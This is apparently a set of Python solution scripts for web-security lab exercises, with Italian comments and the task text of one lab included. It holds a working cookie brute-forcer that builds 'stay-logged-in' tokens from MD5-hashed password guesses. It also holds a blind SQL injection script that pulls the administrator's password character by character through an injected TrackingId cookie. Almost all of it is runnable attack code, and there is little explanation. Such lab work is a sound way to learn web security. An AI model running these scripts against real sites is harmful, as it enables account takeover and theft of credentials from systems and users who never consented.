```python
import hashlib
import base64

def hash_md5(input_string):
  """Hashes a string using MD5 and returns the hexadecimal representation."""
  md5_hash = hashlib.md5()
  md5_hash.update(input_string.encode('utf-8'))
  return md5_hash.hexdigest()

def encode_base64(input_bytes):
  """Encodes bytes using Base64."""
  return base64.b64encode(input_bytes)

# Example usage:
# text_to_hash = "mysecretpassword"
# md5_hashed_text = hash_md5(text_to_hash)

# encode the MD5 hash (as bytes)
# md5_hashed_bytes = md5_hashed_text.encode('utf-8')
# base64_encoded_md5 = encode_base64(md5_hashed_bytes)
```

```python
## Schema usato: Base64("username:MD5(password)")

def generate_cookie(passwords: list, username: str) -> list:
  cookies = []
  for p in passwords:
    # Encode the string to bytes before passing it to encode_base64
    cookie_string = f"{username}:{hash_md5(p)}".encode('utf-8')
    cookies.append((p, encode_base64(cookie_string).decode('utf-8'))) # Decode back to string for easier use
  return cookies
```

```python
import requests as re

def brute_cookie(url, username, passwords):

  cookies = {
      'stay-logged-in' : 'd2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw'
  }

  headers = {
      'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36'
  }

  for cookie_string in generate_cookie(passwords, username):
    cookies['stay-logged-in'] = cookie_string[1]
    print(f"Trying cookie: {cookie_string}...")
    res = re.get(url, allow_redirects=False, cookies=cookies)
    print(f"Status code: {res.status_code}")
    if(res.status_code == 200):
      print(f"Cookie trovato!")
      break
```

## Lab: Blind SQL injection with conditional responses

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a Welcome back message in the page if the query returns any rows.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

 Hint
You can assume that the password only contains lowercase, alphanumeric characters

```python
import requests as re

def guess_admin_password(url, session, tracking_id):
  psw = []
  index_psw = 1
  current_letter = "a"
  operator = ['>', '=']
  op = operator[0]
  while(True):
    cookies = {
        'TrackingId' : f"{tracking_id}' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {index_psw}, 1) {op} '{current_letter}' --",
        'session' : f"{session}"
    }
    res = re.get(url, allow_redirects=False, cookies=cookies)
    if(res.status_code != 200):
      print("Exit App...")
      break
    if(op == ">"):
      if("Welcome" in res.text):
        current_letter = chr(ord(current_letter) + 1)
        print(f"New letter: {current_letter}")
      else:
        op = operator[1]
        print(f"Change to EQUAL operator: {op}")
    elif(op == "="):
      if("Welcome" in res.text):
        print(f"\nFOUND PASSWORD ELEMENT (LETTER): {current_letter}\n")
        psw.append(current_letter)
      else:
        n_psw = try_numbers(url, index_psw, session, tracking_id)
        if n_psw != -1:
          psw.append(n_psw)
        else:
          break
      index_psw+=1
      current_letter = "a"
      op = ">"
      print(f"\nINDEX: {index_psw} OPERATOR: {op} LETTER: {current_letter}\n")
  print(f"Password found: ", end="")
  for el in psw:
    print(el, end="")
```

```python
def try_numbers(url, index_psw, session, tracking_id, op="="):
  print("try numbers function...")
  current_number = 0
  while(current_number < 10):
    cookies = {
        'TrackingId' : f"{tracking_id}' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {index_psw}, 1) {op} '{current_number}' --",
        'session' : f"{session}"
    }
    res = re.get(url, allow_redirects=False, cookies=cookies)
    print(f"trying with trackingId: {cookies['TrackingId']}")
    if("Welcome" in res.text):
      print(f"\nFOUND PASSWORD ELEMENT (NUMBER): {current_number}\n")
      return current_number
    current_number+=1
    print(f"New number: {current_number}")
  else:
    return -1
```
